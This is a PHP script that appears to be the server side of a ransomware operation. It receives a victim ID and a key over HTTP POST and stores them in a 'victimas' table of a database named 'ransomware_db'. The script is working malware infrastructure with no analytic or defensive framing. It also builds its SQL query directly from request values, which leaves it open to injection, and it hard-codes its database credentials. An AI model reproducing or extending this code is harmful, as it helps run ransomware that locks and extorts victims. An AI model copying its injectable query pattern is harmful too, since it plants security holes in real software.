<?php
$server = "localhost";
$username = "newuser";
$password = "password";
$dbname = "ransomware_db";
$pass = (string)$_POST['pass'];
$id = (string)$_POST['id'];
$conn = new mysqli($server, $username, $password, $dbname);
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
} 
$sql = "INSERT INTO victimas (IDD, PASS) VALUES ('$id', '$pass');";
if ($conn->query($sql) === TRUE) {
    echo "Ok.";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}
$conn->close();
?>
